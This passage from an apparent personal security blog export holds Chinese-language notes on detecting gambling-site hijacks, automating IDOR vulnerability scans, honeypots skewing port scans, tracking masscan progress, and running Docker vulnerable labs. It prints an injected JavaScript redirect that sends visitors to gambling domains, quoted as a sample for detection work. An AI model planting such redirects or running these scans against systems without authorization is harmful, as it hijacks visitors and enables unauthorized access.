<h1 id="跳转"><a href="#跳转" class="headerlink" title="跳转:"></a>跳转:</h1><h2 id="案例1-1"><a href="#案例1-1" class="headerlink" title="案例1:"></a>案例1:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var n = Math.floor(Math.random()*3);</span><br><span class="line">if(n==0)&#123;</span><br><span class="line">document.writeln(&#x27;&lt;meta http-equiv=&quot;Refresh&quot; content=&quot;0; url=https://www.68599.com/&quot; /&gt;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if(n==1)&#123;</span><br><span class="line">document.writeln(&#x27;&lt;meta http-equiv=&quot;Refresh&quot; content=&quot;0; url=https://www.68499.com/&quot; /&gt;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if(n==2)&#123;</span><br><span class="line">document.writeln(&#x27;&lt;meta http-equiv=&quot;Refresh&quot; content=&quot;0; url=https://www.131313.com/&quot; /&gt;&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>js的<code>document.writeln</code>重新刷新页面</p>
<p><img src="https://i.loli.net/2019/05/16/5cdc38bec7e5451537.png"></p>
<hr>
<h2 id="案例2-1"><a href="#案例2-1" class="headerlink" title="案例2:"></a>案例2:</h2><p>url:<code>http://www.wuzuilaojiao.com/</code></p>
<p>要挂代理才能访问到博彩页面,页面源码没有关键词,只有图片.</p>
<p><img src="https://i.loli.net/2019/05/16/5cdc3bcc48eb112943.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;frame name=&quot;main&quot; src=&quot;http://mark.zc.qp891.com&quot; scrolling=&quot;yes&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><code>&lt;frame src=&quot;/example/html/frame_b.html&quot;&gt;</code>既是表示当前的框架里面显示src后面这个路径的html页</p>
<p><img src="https://i.loli.net/2019/05/16/5cdc3f048811515654.png"></p>
<hr>
<h2 id="案例3-1"><a href="#案例3-1" class="headerlink" title="案例3:"></a>案例3:</h2><p>url: <code>www.gzbihua.com</code></p>
<p><img src="https://i.loli.net/2019/05/16/5cdc471b7c45e43997.png"></p>
<p><code>https://www.gzbihua.com/template/pc/skin/js/jquery.tz.js</code></p>
<p>这个js应该只是打乱了,没有混淆.</p>
<p><img src="https://i.loli.net/2019/05/16/5cdc476987bd781253.png"></p>
<hr>
<h2 id="案例4-1"><a href="#案例4-1" class="headerlink" title="案例4:"></a>案例4:</h2><p>初始url:<code>http://www.aohougz.com/</code></p>
<p><img src="https://i.loli.net/2019/05/16/5cdd75977a49848288.png"></p>
<p>第一次跳转到:<code>https://www.mtc39.com/?att=996</code><br>再跳转到:<code>http://www.13145.com/</code></p>
<p><img src="https://i.loli.net/2019/05/16/5cdd75f55e34e10877.png"></p>
<p>最终页面没有敏感词.只有个图片里有文字:彩票</p>
<blockquote>
<p>如果在最终页面,再通过敏感字判断也不行.<br>初始url的源码里是有关键字的<code>彩票 , 投注</code><br>那么判断思路,应该是在每个页面都要进行判断.</p>
</blockquote>
<hr>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>js的<code>document.writeln</code><br>frame标签的src</p>
<hr>
<h1 id="敏感字词库"><a href="#敏感字词库" class="headerlink" title="敏感字词库:"></a>敏感字词库:</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">足球</span><br><span class="line">外围</span><br><span class="line">好彩</span><br></pre></td></tr></table></figure>

<blockquote>
<p>待补充</p>
</blockquote>
<hr>
<h1 id="想法"><a href="#想法" class="headerlink" title="想法:"></a>想法:</h1><p>网上固然有很多别人的文章,但是不如自己切实的去访问,记录一下.<br>毕竟别人的东西,只是看了,最终也不能转化吸收成你的.</p>
]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈越权自动化</title>
    <url>//26609.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>自己拍脑袋写了个idor_auto脚本去扫描越权漏洞。发现效果还可以。</p>
<p>上网查下资料整理下思路。</p>
<hr>
<h1 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介:"></a>简介:</h2><p>定义: 增、删、改、查，缺乏权限鉴定或者鉴定不严</p>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类:"></a>分类:</h2><ul>
<li>未授权访问</li>
<li>水平越权</li>
<li>垂直越权</li>
</ul>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200406154039.png" alt="20200406154039"></p>
<hr>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例:"></a>案例:</h2><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200406154235.png" alt="20200406154235"></p>
<hr>
<h2 id="越权漏洞的痛点"><a href="#越权漏洞的痛点" class="headerlink" title="越权漏洞的痛点:"></a>越权漏洞的痛点:</h2><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200406154303.png" alt="20200406154303"></p>
<hr>
<h1 id="工具的设计思路"><a href="#工具的设计思路" class="headerlink" title="工具的设计思路:"></a>工具的设计思路:</h1><h2 id="第一版"><a href="#第一版" class="headerlink" title="第一版:"></a>第一版:</h2><p><a href="https://jerrychan807.github.io/2019/12/29/%E8%B6%8A%E6%9D%83%E5%8D%8A%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8F%92%E4%BB%B6%E7%9A%84%E5%B0%9D%E8%AF%95/">越权半自动化插件的尝试</a></p>
<p>缺点在于要自己先找到某个包的某个参数是存在越权漏洞的,不够自动化。</p>
<hr>
<h2 id="第二版"><a href="#第二版" class="headerlink" title="第二版:"></a>第二版:</h2><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200406165919.png" alt="20200406165919"></p>
<p>输出的结果:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200406173351.png" alt="20200406173351"></p>
<p>相对第一版来说,更通用。<br>自动化程度更高</p>
<p>缺点:需要2个账户在登录下，尽可能多的点击相同的功能点,触发请求，效率有点低。</p>
<p>存在误报的情况:</p>
<p>比如公共接口:</p>
<p>用两个账户的token去请求链接可以得到同样的响应结果,但是该页面本身没有数据操作的功能。</p>
<p>可以理解为这类结果为公共接口，例如 获取地区省市县的接口，获取最新更新包的下载地址接口。</p>
<p>不管用谁的token获取的结果都是一样的。</p>
<hr>
<h1 id="参考别人的思路"><a href="#参考别人的思路" class="headerlink" title="参考别人的思路:"></a>参考别人的思路:</h1><h2 id="ele"><a href="#ele" class="headerlink" title="ele:"></a>ele:</h2><h3 id="思路设计1-Request重放"><a href="#思路设计1-Request重放" class="headerlink" title="思路设计1:Request重放"></a>思路设计1:Request重放</h3><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200406155039.png" alt="20200406155039"></p>
<p>缺乏鉴权的部分,图中的用法是单纯替换token,而我的工具的做法是,替换整个请求body。</p>
<p>单纯替换token的粒度更低,相比我的方案可以发现更多:在url上的越权,一些头部字段的越权，这感觉效果更好。</p>
<p>而且,可以只需要用单一用户点击功能，触发请求就可以了。相比我的方案(两个账户触发请求)来说，效率更高。</p>
<p>修改ID的部分,感觉不能单纯的对数字加一减一,效果不好，比如说订单号order_id,加一减一之后不一定是真实存在的订单号。</p>
<p>过滤部分，过滤掉本身无需鉴权的请求,这一点可以大大减少误报。</p>
<hr>
<h3 id="思路设计2-Response比对"><a href="#思路设计2-Response比对" class="headerlink" title="思路设计2:Response比对"></a>思路设计2:Response比对</h3><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200406175758.png" alt="20200406175758"></p>
<p>比较body的内容是否完全一样,这样会漏报。因为有些response里面含有一些随机值。</p>
<p>比较body length的话,可能会误报,但是总比漏报好。</p>
<p>比较好的比对方案是: status code + body length</p>
<hr>
<h2 id="中通scr"><a href="#中通scr" class="headerlink" title="中通scr:"></a>中通scr:</h2><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200406182126.png" alt="20200406182126"></p>
<p>开发了浏览器插件供QA人员使用,触发请求部分不需要由安全的同事来做,这一点很赞。</p>
<blockquote>
<p>首先我们来看，越权漏洞的本质是服务方没有正确地进行鉴权，如果能够准确无误地执行了鉴权的动作，那就不会存在越权漏洞。这里有一个前提就是合理的权限设定，判断是否正确地执行了鉴权，其实就是判断真实的响应结果是否和规划的权限设定里测试用例的预期结果是否一致，如果一致那就不存在越权漏洞，反之则存在，以上是整个方案的基础原理。</p>
</blockquote>
<blockquote>
<p>其次在工程上如何实现呢？要获取真实的响应结果和规划的权限设定，需要六个实体的参与：<strong>安全测试人员、检测应用、部署检测应用的设备、统一认证中心、统一权限中心、统一资源中心</strong>，关键点在于自动化地安全认证（安全测试人员登录检测应用的身份认证和检测应用作为独立身份与其它实体的应用间的认证）<strong>、自动化地获取被测系统包含的所有权限列表并授权（检测应用从统一权限中心拉取后以安全测试人员的身份请求权限中心进行逐一授权）</strong>、自动化地获取被测系统的所有对外服务及对应的包含预期结果的测试用例（服务及测试用例作为资源被自动化地解析到统一资源中心，检测应用从统一资源中心自动拉取），检测应用在通过相关认证和授权后可以自动化地按照拉取的服务列表执行对应的测试用例并进行判断，然后自动化地取消上一个授权获取下一个授权直到结束。</p>
</blockquote>
<blockquote>
<p>由于自动化授权的敏感性，可以由检测应用和部署检测应用的设备结合成网络代理并且由安全测试人员提供TOTP满足信任要求，另外测试用例要做到生产环境的无害性，这样也可以直接部署到生产环境进行定期自动化测试。接下来对部分细节作简要阐述，在传统开发模式中，系统规划的权限设定通常存在开发人员的大脑和服务的鉴权代码中，这样非常不利于上线前权限设计的合理性和正确性的评审以及上线后鉴权逻辑实现正确性的核查，也是越权漏洞频发的根因，我们需要在服务开发之初就文档化下来，包括服务的定义、安全测试用例及预期的结果，在开发实现方面，我们可以借助流行的IDL接口描述语言的一些特性，如protobuf的descriptor或option，IDL用来定义服务，其中的一些特性用来定义安全测试用例及预期的结果，结合起来可以支持非常复杂的场景，服务方面既可以提供RPC也可以提供RESTful形式，意味着既可以支持中台对外服务也可以支持对内的微服务（对内的微服务作为独立的身份实体），安全测试用例方面既可以支持行为、菜单等权限，也可以支持数据权限，整个的定义如proto文件需要自动化地解析到资源中心并且和应用标识关联起来。另外在统一权限中心的设计方面，我们需要将应用所有的权限集中配置和使用，并且做到配置项和服务的关联，这样可以实现任意权限模型的支持，如RBAC、ABAC等。</p>
</blockquote>
<p>这个零信任安全架构下的全新思路有点东西。。。</p>
<hr>
<h1 id="构思-另一种更好的方案"><a href="#构思-另一种更好的方案" class="headerlink" title="构思:另一种更好的方案:"></a>构思:另一种更好的方案:</h1><p>半自动化的原因是因为触发请求的部分最好是由人来触发。这样能保证请求的真实、多和全。</p>
<p>甲方的话可以通过查询api的日志来做到这一点。</p>
<p>api日志里面的请求是完整的,真实的，是由用户触发的。</p>
<p>比如查询最近10分钟的api日志,就可以拿到多个用户的有效的真实请求。</p>
<p>然后进行测试，首先这样就做到了在收集数据包方面的自动化，不需要再一个个的去点了。</p>
<p>但是这样的话，有个需要考虑的点：如果是在生产环境，很容易出现给其他用户写入脏数据</p>
<p>怎么样保证无害化？又是一个值得考虑的点。比如用生产环境的日志(生产环境的日志可能又不够全)。</p>
<hr>
<h1 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题:"></a>其他问题:</h1><h2 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h2><p>查是最容易实现的，那么增删改呢？</p>
<h2 id="没有数据"><a href="#没有数据" class="headerlink" title="没有数据"></a>没有数据</h2><p>有些接口,如果你的2个测试账户都是没有数据的话，往往测试账号都是没有什么信息的。</p>
<p>那么不管怎么测，他们的结果都是空的，没有什么意义的数据。</p>
<p>这个时候在实际的渗透测试中,比如phone参数,你会用特制的手机号列表去遍历，直到一个length特别不同的包出现，这个时候才能真正的证明这个接口是有越权的。</p>
<hr>
<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
<li><a href="http://www.doc88.com/p-3939514860099.html">一种Web应用越权漏洞自动化检测实现</a></li>
<li><a href="https://wenku.baidu.com/view/f9cb775ccdbff121dd36a32d7375a417866fc1b7.html">越权半自动化检测实践</a></li>
<li><a href="https://www.secrss.com/articles/7531">中通分布式被动安全扫描实践</a></li>
<li><a href="https://www.secrss.com/articles/13426">中通安全开源项目之越权漏洞自动化检测</a></li>
</ul>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>端口扫描-遇到防护设备的情况</title>
    <url>//62552.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h1><p>在做主机资产扫描-识别端口开放情况与服务的时候,一开始很容易遇到的问题就是:<strong>识别端口数量过少</strong>,</p>
<p>就是有些端口明明开放了,你却识别不出来.</p>
<p>要解决这个问题,可以考虑以下思路:</p>
<ul>
<li>修改<code>nmap</code>参数,<strong>跳过存活主机的发现</strong></li>
<li>有可能是发包数过快,网络设备处理不过来,存在<strong>丢包</strong>的情况</li>
</ul>
<h1 id="新的问题"><a href="#新的问题" class="headerlink" title="新的问题:"></a>新的问题:</h1><p>解决完<strong>识别端口数量过少</strong>的问题后,后来又出现了另一个问题:<strong>识别端口数量过多</strong></p>
<p>例子1:</p>
<p><img src="https://i.loli.net/2019/04/26/5cc2e35e8f5d9.jpg"></p>
<p>例子2:</p>
<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1g19n1px5zhj31co0ruk9j.jpg"></p>
<p>图中显示的端口都是开放状态.</p>
<p>refs:DC0531技术沙龙-国内SRC漏洞挖掘经验和技巧分享</p>
<hr>
<h1 id="原因"><a href="#原因" class="headerlink" title="原因:"></a>原因:</h1><p>目标主机可能有防护设备如<strong>蜜罐</strong>等.</p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1g19nopfda1j30a60a4goh.jpg"></p>
<hr>
<h2 id="什么是蜜罐"><a href="#什么是蜜罐" class="headerlink" title="什么是蜜罐"></a>什么是蜜罐</h2><blockquote>
<p>通常将**蜜罐(honeypot)**定义为一种安全资源.</p>
<p><strong>它不需要提供实际的应用，蜜罐的存在价值就是诱导和记录攻击行为</strong>，从而了解攻击者的入侵方法和手段，并能够延缓其攻击进程</p>
<p>进而根据捕获的攻击行为数据，分析攻击者使用的攻击方法和工具，从而让防御方针对性地增强系统的安全防护能力。</p>
</blockquote>
<p><strong>有点草船借箭的意味.</strong></p>
<hr>
<h2 id="蜜罐的分类"><a href="#蜜罐的分类" class="headerlink" title="蜜罐的分类"></a>蜜罐的分类</h2><p><strong>蜜罐的交互程度通常取决于蜜罐对相应服务的模拟程度。</strong></p>
<p>（1）低交互蜜罐<br>该类蜜罐通常只提供少量的交互功能，<strong>蜜罐在特定端口监听连接并记录数据包，可以用来实现端口扫描和暴力破解的检测</strong>。低交互蜜罐结构简单，易于安装部署，由于模拟程度低功能较少，收集信息有限但风险也较低。</p>
<p>（2）高交互蜜罐<br>高交互蜜罐通常基于真实的应用环境来构建，能提供真实的服务。高交互蜜罐可用来获取大量的信息，能够捕获攻击者多种操作行为，从而具备发现新的攻击方式和漏洞利用方法的能力。由于高交互蜜罐给攻击者提供了一个相对真实的应用环境，因此风险较大，通常会注重数据控制方面的功能。</p>
<hr>
<h2 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结:"></a>简单总结:</h2><p>黑客入侵或做安全检测的时候,往往要先做信息搜集.</p>
<p>第一步便是要看看目标主机开放了什么端口,以及端口上对应的服务.(攻击面 attack face)</p>
<p>而简单的,部署上一个<strong>低交互蜜罐</strong>,就可以增大攻击者(检测者)的难度.cool~</p>
<hr>
<h1 id="对检测者的影响"><a href="#对检测者的影响" class="headerlink" title="对检测者的影响:"></a>对检测者的影响:</h1><h2 id="卡死检测者"><a href="#卡死检测者" class="headerlink" title="卡死检测者:"></a>卡死检测者:</h2><p>一般检测的时候,我们都会对<strong>整个网段进行全端口扫描</strong>.</p>
<p>如果这个网段内某一两台主机部署了蜜罐的话,那么这整个检测任务会处于几乎卡死的状态.</p>
<p>所以,一台部署了蜜罐的设备,可能不仅仅是保护自身，对于同网段的机子来说也有一定的益处.</p>
<h2 id="大量脏数据入库"><a href="#大量脏数据入库" class="headerlink" title="大量脏数据入库:"></a>大量脏数据入库:</h2><p>如果检测的时候,没有恰当的处理,很有可能会造成大量的脏数据入库.</p>
<hr>
<h1 id="简单的解决方案"><a href="#简单的解决方案" class="headerlink" title="简单的解决方案:"></a>简单的解决方案:</h1><p>识别端口的开放情况和服务,这两个功能一定要分开.</p>
<blockquote>
<p>可见开发时的设计要遵从 <strong>高内聚、低耦合原则</strong>.</p>
</blockquote>
<p>如果识别一个主机开放了过多的端口(如超过100个),那么可以选择</p>
<ul>
<li>跳过这个主机.</li>
<li>仅识别top 100</li>
</ul>
<hr>
<h1 id="疑问"><a href="#疑问" class="headerlink" title="疑问:"></a>疑问:</h1><p>某个主机或某个网段内部署了蜜罐,会不会有点 <strong>此地无银三百两</strong>的意味呢?</p>
<p>或许发现、识别蜜罐的同时,也侧面说明了这个网段内有企业重要的资产?!</p>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><a href="http://phantom0301.cc/2016/03/23/Antihoneypot/">反蜜罐技术学习</a></li>
<li><a href="https://cloud.tencent.com/developer/article/1047554">浅谈简易端口扫描威胁感知系统的设计与实现</a></li>
<li><a href="https://sosly.me/index.php/2017/09/05/jymiguan2/">蜜罐与内网安全从0到1（二）</a></li>
<li>DC0531技术沙龙-国内SRC漏洞挖掘经验和技巧分享</li>
</ul>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>获取masscan的扫描进度</title>
    <url>//4287.html</url>
    <content><![CDATA[<h1 id="Preface"><a href="#Preface" class="headerlink" title="Preface:"></a>Preface:</h1><p>一开始打算通过<code>subprocess</code>模块来调用<code>masscan</code>,然后获取它输出的进度。</p>
<p>但是发现它的进度输出是覆盖刷新输出的。</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d74ccaa35.jpg"></p>
<p>这个时候，<code>subprocess</code>就无法获得它的输出了。</p>
<p>想了下,<code>masscan</code>这个刷新输出应该是优化过的结果,避免打印出太多重复无效的信息。</p>
<p>这个时候,我们只要修改一下它的输出就可以达到效果.</p>
<hr>
<h1 id="修改源码"><a href="#修改源码" class="headerlink" title="修改源码:"></a>修改源码:</h1><p>搜索了一下,参考:<a href="https://blog.csdn.net/zhanghuoding/article/details/52041120">C语言实现在控制台同一行覆盖刷新输出，以及’\b’退格控制字符的使用</a></p>
<p>知道<code>printf(&quot;\r&quot;); </code>是可以做到刷新输出的效果的。</p>
<p>搜索关键字:<code>rate:</code></p>
<p>定位到<code>main-status.c</code>这个文件</p>
<p>修改这一行.将覆盖刷新输出改成 换行输出。<br><img src="https://i.loli.net/2019/04/25/5cc1d74dc815b.jpg"></p>
<p>重新编译运行.</p>
<p>可以看到效果:</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d74f398a5.jpg"></p>
<hr>
<h2 id="获取进度百分比"><a href="#获取进度百分比" class="headerlink" title="获取进度百分比:"></a>获取进度百分比:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getPercentageNum</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    正则匹配百分比数字</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    re_pattern = <span class="string">r&quot;(\d&#123;1,2&#125;.\d&#123;1,2&#125;)\%&quot;</span></span><br><span class="line">    num_match_list = re.findall(re_pattern, content)</span><br><span class="line">    <span class="keyword">if</span> num_match_list:</span><br><span class="line">        <span class="keyword">return</span> num_match_list[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd = shlex.split(shell_cmd)</span><br><span class="line"><span class="built_in">print</span> cmd</span><br><span class="line">        </span><br><span class="line">p = subprocess.Popen(cmd, shell=<span class="literal">False</span>, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)</span><br><span class="line"><span class="keyword">while</span> p.poll() <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    line = p.stdout.readline()</span><br><span class="line">    line = line.strip()</span><br><span class="line">    <span class="keyword">if</span> line:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;percentage: [&#123;&#125;]&#x27;</span>.<span class="built_in">format</span>(line))</span><br><span class="line">        <span class="built_in">print</span> getPercentageNum(line)</span><br></pre></td></tr></table></figure>

<p>通过上面两个函数,就可以获取到 扫描的进度百分比了.</p>
<h1 id="另一种思路"><a href="#另一种思路" class="headerlink" title="另一种思路:"></a>另一种思路:</h1><p>开启一个msscan,按下回车键的时候,会再次输出进度。</p>
<p>或许可以与进程通信,然后发送信号,来获取进度信息。</p>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>记录-Centos7 Docker部署漏洞环境</title>
    <url>//54517.html</url>
    <content><![CDATA[<h1 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装:"></a>docker安装:</h1><ul>
<li>查询可用版本</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># yum list docker-ce --showduplicates | sort -r</span></span><br><span class="line">已加载插件：fastestmirror, langpacks</span><br><span class="line">可安装的软件包</span><br><span class="line">Loading mirror speeds from cached hostfile</span><br><span class="line">docker-ce.x86_64            3:18.09.2-3.el7                     docker-ce-stable</span><br><span class="line">docker-ce.x86_64            3:18.09.1-3.el7                     docker-ce-stable</span><br><span class="line">docker-ce.x86_64            3:18.09.0-3.el7                     docker-ce-stable</span><br><span class="line">docker-ce.x86_64            18.06.3.ce-3.el7                    docker-ce-stable</span><br><span class="line">docker-ce.x86_64            18.06.2.ce-3.el7                    docker-ce-stable</span><br><span class="line">docker-ce.x86_64            18.06.1.ce-3.el7                    docker-ce-stable</span><br><span class="line">docker-ce.x86_64            18.06.0.ce-3.el7                    docker-ce-stable</span><br><span class="line">docker-ce.x86_64            18.03.1.ce-1.el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            18.03.0.ce-1.el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            17.12.1.ce-1.el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            17.12.0.ce-1.el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            17.09.1.ce-1.el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            17.09.0.ce-1.el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            17.06.2.ce-1.el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            17.06.1.ce-1.el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            17.06.0.ce-1.el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            17.03.3.ce-1.el7                    docker-ce-stable</span><br><span class="line">docker-ce.x86_64            17.03.2.ce-1.el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            17.03.1.ce-1.el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            17.03.0.ce-1.el7.centos             docker-ce-stable</span><br></pre></td></tr></table></figure>

<p>如果使用<code>yum install docker-ce </code>下载下来的docker版本是很有可能是第一个<code>3:18.09.2-3.el7</code>,运行的时候会报错,要指定<code>centos</code>的版本下载才能正常运行.</p>
<ul>
<li>安装指定版本</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># yum install docker-ce-18.03.1.ce-1.el7.centos</span></span><br></pre></td></tr></table></figure>
<ul>
<li>启动docker</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># systemctl start docker </span></span><br></pre></td></tr></table></figure>

<ul>
<li>测试安装结果</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># docker run hello-world                       </span></span><br><span class="line"></span><br><span class="line">Hello from Docker!</span><br><span class="line">This message shows that your installation appears to be working correctly.</span><br><span class="line"></span><br><span class="line">To generate this message, Docker took the following steps:</span><br><span class="line"> 1. The Docker client contacted the Docker daemon.</span><br><span class="line"> 2. The Docker daemon pulled the <span class="string">&quot;hello-world&quot;</span> image from the Docker Hub.</span><br><span class="line">    (amd64)</span><br><span class="line"> 3. The Docker daemon created a new container from that image <span class="built_in">which</span> runs the</span><br><span class="line">    executable that produces the output you are currently reading.</span><br><span class="line"> 4. The Docker daemon streamed that output to the Docker client, <span class="built_in">which</span> sent it</span><br><span class="line">    to your terminal.</span><br><span class="line"></span><br><span class="line">To try something more ambitious, you can run an Ubuntu container with:</span><br><span class="line"> $ docker run -it ubuntu bash</span><br><span class="line"></span><br><span class="line">Share images, automate workflows, and more with a free Docker ID:</span><br><span class="line"> https://hub.docker.com/</span><br><span class="line"></span><br><span class="line">For more examples and ideas, visit:</span><br><span class="line"> https://docs.docker.com/get-started/  </span><br></pre></td></tr></table></figure>

<p>无报错,则正常</p>
<hr>
<h1 id="漏洞环境下载"><a href="#漏洞环境下载" class="headerlink" title="漏洞环境下载:"></a>漏洞环境下载:</h1><ul>
<li><a href="https://github.com/vulhub/vulhub">Pre-Built Vulnerable Environments Based on Docker-Compose</a></li>
</ul>
<p>根据readme 安装</p>
<ul>
<li><p><a href="https://github.com/Medicean/VulApps">快速搭建各种漏洞环境(Various vulnerability environment</a></p>
</li>
<li><p><a href="https://blog.51cto.com/13767724/2164915?source=dra">CentOS7下安装Docker-Compose</a></p>
</li>
<li><p><a href="https://blog.csdn.net/xiaoxianerqq/article/details/80579113">cannot uninstall a distutils installed project’</a></p>
</li>
</ul>
<hr>
<h1 id="开机自启"><a href="#开机自启" class="headerlink" title="开机自启:"></a>开机自启:</h1><h2 id="docker-服务开机自启"><a href="#docker-服务开机自启" class="headerlink" title="docker 服务开机自启"></a>docker 服务开机自启</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># systemctl enable docker.service</span></span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/docker.service to /usr/lib/systemd/system/docker.service.</span><br></pre></td></tr></table></figure>

<h2 id="漏洞环境容器的开机自启"><a href="#漏洞环境容器的开机自启" class="headerlink" title="漏洞环境容器的开机自启"></a>漏洞环境容器的开机自启</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 拉取镜像到本地</span></span><br><span class="line">[root@localhost ~]<span class="comment"># docker pull medicean/vulapps:s_struts2_s2-032 </span></span><br></pre></td></tr></table></figure>


<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动环境</span></span><br><span class="line">[root@localhost ~]<span class="comment"># docker run -d -p 80:8080 medicean/vulapps:s_struts2_s2-032</span></span><br><span class="line">6aa16caac712adcc0f5410dbed2aaa14a303ede2378311f0c2222b1901bcef25</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看CONTAINER ID </span></span><br><span class="line">[root@localhost ~]<span class="comment"># docker ps</span></span><br><span class="line">CONTAINER ID        IMAGE                               COMMAND                  CREATED             STATUS              PORTS                            NAMES</span><br><span class="line">6aa16caac712        medicean/vulapps:s_struts2_s2-032   <span class="string">&quot;/usr/local/tomcat/b…&quot;</span>   22 seconds ago      Up 21 seconds       0.0.0.0:80-&gt;8080/tcp             keen_carson</span><br><span class="line">ee8ea1d1acdd        medicean/vulapps:r_redis_1          <span class="string">&quot;/start.sh&quot;</span>              30 minutes ago      Up 4 minutes        22/tcp, 0.0.0.0:6379-&gt;6379/tcp   redisvul</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 参数always:始终重启,更新设为开机自启</span></span><br><span class="line">[root@localhost ~]<span class="comment"># docker update --restart=always 6aa16caac712</span></span><br><span class="line">6aa16caac712</span><br></pre></td></tr></table></figure>

<p>重启机子,后允许<code>docker ps </code>查看是否自启成功</p>
<h1 id="其他常用命令"><a href="#其他常用命令" class="headerlink" title="其他常用命令:"></a>其他常用命令:</h1><h2 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器:"></a>删除容器:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看所有container</span></span><br><span class="line">root@Linx:~/apache<span class="comment"># docker ps -a</span></span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                       PORTS               NAMES</span><br><span class="line">e6318265a202        httpd:centos        <span class="string">&quot;/run.sh&quot;</span>           5 minutes ago       Exited (127) 5 minutes ago                       httpd1              </span><br><span class="line">eaf9ee72f448        httpd:centos        <span class="string">&quot;/run.sh&quot;</span>           6 minutes ago                                                        httpd     </span><br></pre></td></tr></table></figure>

